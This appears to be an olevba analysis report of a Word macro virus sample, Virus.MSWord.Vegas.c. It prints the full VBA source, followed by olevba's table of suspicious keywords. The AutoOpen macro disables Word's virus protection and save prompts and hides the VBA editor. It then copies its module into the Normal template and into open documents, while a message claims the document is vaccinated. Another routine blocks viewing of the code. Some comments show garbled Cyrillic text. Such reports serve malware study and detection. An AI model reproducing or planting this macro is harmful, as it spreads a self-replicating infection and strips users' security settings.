olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vegas.c-b2ede24528498508c056ec6e09112abce7de51b6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vegas.c-b2ede24528498508c056ec6e09112abce7de51b6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordKiller.bas 
in file: Virus.MSWord.Vegas.c-b2ede24528498508c056ec6e09112abce7de51b6 - OLE stream: 'Macros/VBA/WordKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
'Copyright © 2001 by ONO.
'All rights reserved.
'Anti WordKiller
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRD010^.tmp"
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordKiller" Then
Rem    Application.Run MacroName:="Normal.WordKiller.ToolsMacro"
'èùåì â àêòèâíîì äîêóìåíòå
 _
 _
        
End If
Next i
For i = 1 To dc.Count
If dc(i).Name = "WordDigger" Then
Rem    Application.Run MacroName:="Normal.WordKiller.ToolsMacro"
'èùåì â àêòèâíîì äîêóìåíòå
 _
 _
        
End If
Next i
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordKiller" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordKiller" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
MsgBox "Äîêóìåíò âàêöèíèðîâàí ïðîòèâ âèðóñîâ WordKiller è WordDigger" + vbCrLf + "", vbOKOnly + vbInformation
End Sub
Sub ViewVBCode()
If Dir("c:\killer.my") = "" Then
FatalAppExit 0, "ß íå äóìàþ ÷òî ýòî òåáå íóæíî!"
Else
Application.VBE.MainWindow.Visible = True
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

